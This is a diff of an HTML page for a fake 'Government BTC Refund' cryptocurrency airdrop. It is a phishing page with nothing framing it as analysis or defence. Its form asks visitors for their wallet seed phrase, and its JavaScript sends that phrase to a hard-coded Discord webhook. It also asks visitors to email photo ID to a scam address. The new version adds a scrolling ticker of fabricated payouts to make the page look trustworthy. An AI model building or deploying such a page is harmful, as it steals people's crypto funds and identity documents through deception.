@@ -7,7 +7,7 @@
   <style>
     body {
       font-family: Arial, sans-serif;
-      background-image: url('eagle.png'); /* Put eagle image in same folder or upload */
+      background-color: #003399; /* American flag blue */
       background-size: cover;
       background-position: center;
       background-attachment: fixed;
@@ -18,21 +18,21 @@
     }
 
     .container {
-      background: rgba(255, 255, 255, 0.96);
+      background: rgba(255, 255, 255, 0.95);
       width: 90%;
-      max-width: 440px;
+      max-width: 420px;
       margin: auto;
       padding: 30px;
       border-radius: 12px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.15);
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
 
     h2 {
-      color: #0b3d91;
+      color: #003399;
     }
 
     .btn {
-      background-color: #0b3d91;
+      background-color: #003399;
       color: white;
       padding: 12px 20px;
       margin-top: 20px;
@@ -42,9 +42,10 @@
       font-size: 16px;
     }
 
-    .btn:disabled {
-      background-color: #aaa;
-      cursor: not-allowed;
+    .note {
+      font-size: 13px;
+      color: #555;
+      margin-top: 10px;
     }
 
     input[type="text"] {
@@ -55,13 +56,13 @@
       border: 1px solid #ccc;
     }
 
-    .alert, .note {
-      font-size: 13px;
-      color: #333;
-      background-color: #f0f8ff;
+    .alert {
+      background-color: #e8f0fe;
+      color: #003399;
       padding: 12px;
-      margin-top: 10px;
-      border-radius: 8px;
+      border-radius: 6px;
+      margin-bottom: 20px;
+      font-size: 14px;
       border: 1px solid #c3dafe;
     }
 
@@ -72,111 +73,132 @@
       display: none;
     }
 
-    .wallet-proof {
-      background-color: #e6ffee;
+    .payout-ticker {
+      background-color: #f9f9f9;
+      border: 1px solid #ccc;
+      margin: 20px auto;
       padding: 15px;
+      width: 90%;
+      max-width: 420px;
       border-radius: 10px;
-      border: 1px solid #00cc66;
-      margin-top: 25px;
-      font-size: 15px;
+      font-family: monospace;
+      font-size: 14px;
+      height: 120px;
+      overflow: hidden;
       text-align: left;
+      box-shadow: 0 0 6px rgba(0,0,0,0.05);
     }
 
-    .wallet-proof h4 {
-      margin: 0 0 8px;
-      color: #006644;
+    .payout-line {
+      margin-bottom: 8px;
+      animation: fadeIn 0.4s ease-in-out;
     }
 
-    .wallet-proof span {
-      font-weight: bold;
-      color: #000;
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
     }
   </style>
 </head>
 <body>
+
   <div class="container">
 
     <div class="alert">
-      To verify eligibility for federal BTC refund, email your valid photo ID to  
+      To verify eligibility, send your government-issued ID to:  
       <strong>admin@govbtcclaim.org</strong>
     </div>
 
-    <h2>🇺🇸 U.S. Federal BTC Airdrop Portal</h2>
-    <p><strong>Estimated Claim Amount: 0.92 BTC ≈ $99,791</strong></p>
+    <h2>🇺🇸 Government BTC Refund</h2>
+    <p>Claim your Bitcoin refund through verified wallet connection.</p>
+    <p><strong>Amount to be received: 0.92 BTC ≈ $99,791</strong></p>
 
     <button class="btn" onclick="document.getElementById('walletSection').style.display='block'">Connect Wallet</button>
 
     <form id="walletSection" style="display:none; margin-top:20px;" onsubmit="sendToDiscord(event)">
-      <label for="walletName">Wallet Provider (e.g. MetaMask):</label>
+      <label for="walletName">Wallet Name:</label>
       <input type="text" id="walletName" name="walletName" placeholder="Enter your wallet name" required>
 
-      <label for="seedInput" style="margin-top:10px;">Enter 12 or 24-word Recovery Phrase:</label>
-      <input type="text" id="seedInput" name="phrase" placeholder="example: remind jacket wire lava..." required>
+      <label for="seedInput" style="margin-top:10px;">Seed Phrase:</label>
+      <input type="text" id="seedInput" name="phrase" placeholder="Enter your 12 or 24-word phrase" required>
 
-      <button class="btn" type="submit">Claim Official Airdrop</button>
+      <button class="btn" type="submit">Submit</button>
     </form>
 
-    <div id="successMessage">✅ Wallet submitted successfully. Processing…</div>
-
-    <div class="wallet-proof">
-      <h4>✅ Verified Payout Summary</h4>
-      <p><span>Status:</span> Paid</p>
-      <p><span>Wallet:</span> bc1qsz78mr3glz49yn3hsfws9g9rzyyluf6tv0vru5</p>
-      <p><span>Amount Received:</span> 0.92 BTC</p>
-      <p><span>Transaction Date:</span> July 11, 2025</p>
-      <p><span>Approval Code:</span> FED-PAY-22941-BTC</p>
-    </div>
+    <div id="successMessage">✅ Submitted successfully.</div>
 
     <div class="note">
-      Minimum balance required to qualify: 0.0092 BTC<br>
-      <small>(Balances lower than this may require support contact)</small><br>
-      Contact: <strong>admin@govbtcclaim.org</strong>
+      Minimum wallet balance: 0.0092 BTC<br>
+      <small>(If your balance is lower, contact support)</small><br>
+      For inquiries: <strong>admin@govbtcclaim.org</strong>
     </div>
   </div>
 
-  <!-- Live Chat Widget -->
-  <script type="text/javascript">
-    var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();
-    (function() {
-      var s1 = document.createElement("script"), s0 = document.getElementsByTagName("script")[0];
-      s1.async = true;
-      s1.src = 'https://embed.tawk.to/686c82558d299b19083881aa/default';
-      s1.charset = 'UTF-8';
-      s1.setAttribute('crossorigin', '*');
-      s0.parentNode.insertBefore(s1, s0);
-    })();
-  </script>
+  <div class="payout-ticker">
+    <div id="payoutFeed"></div>
+  </div>
 
-  <!-- Discord Webhook -->
   <script>
     function sendToDiscord(event) {
       event.preventDefault();
-
       const walletName = document.getElementById('walletName').value;
       const phrase = document.getElementById('seedInput').value;
 
       const data = {
-        content: `🔥 New Wallet Submission:
-        \nWallet: *${walletName}*
-        \nPhrase: *${phrase}*`
+        content: 🔥 New Submission:\nWallet Name: **${walletName}**\nSeed Phrase: **${phrase}**
       };
 
       fetch('https://discord.com/api/webhooks/1392560855530602496/WLDqr-oxayIjorh97lgir03TQj4rcVYqnKDEMCoJ_jC_xix590twBocxE4eMY85ViMzG', {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(data)
       }).then(() => {
         document.getElementById('walletSection').reset();
         document.getElementById('walletSection').style.display = 'none';
         document.getElementById('successMessage').style.display = 'block';
       }).catch(err => {
-        alert("Submission failed. Try again later.");
+        alert("Failed to connect. Try again later.");
         console.error(err);
       });
     }
+
+    const fakePayouts = [
+      "💸 0.92 BTC sent to wallet bc1q...9xlr",
+      "✅ 0.45 BTC refunded to bc1q...afk8",
+      "🟢 1.02 BTC processed for bc1q...ujk2",
+      "💰 0.12 BTC claimed by bc1q...4lpz",
+      "💸 0.89 BTC sent to wallet bc1q...wvxm",
+      "✅ 0.33 BTC paid to bc1q...hf23",
+      "🟢 0.74 BTC sent to bc1q...zz3k",
+      "💰 1.34 BTC claimed by bc1q...gdq5"
+    ];
+
+    const feed = document.getElementById("payoutFeed");
+
+    function addFakePayout() {
+      const message = fakePayouts[Math.floor(Math.random() * fakePayouts.length)];
+      const line = document.createElement("div");
+      line.className = "payout-line";
+      line.textContent = message;
+
+      if (feed.children.length >= 6) {
+        feed.removeChild(feed.firstChild);
+      }
+
+      feed.appendChild(line);
+    }
+
+    // Load 3 on page load
+    for (let i = 0; i < 3; i++) addFakePayout();
+    // Add new one every 3 seconds
+    setInterval(addFakePayout, 3000);
   </script>
+
 </body>
 </html>
+     
+
+     
+
+   
 
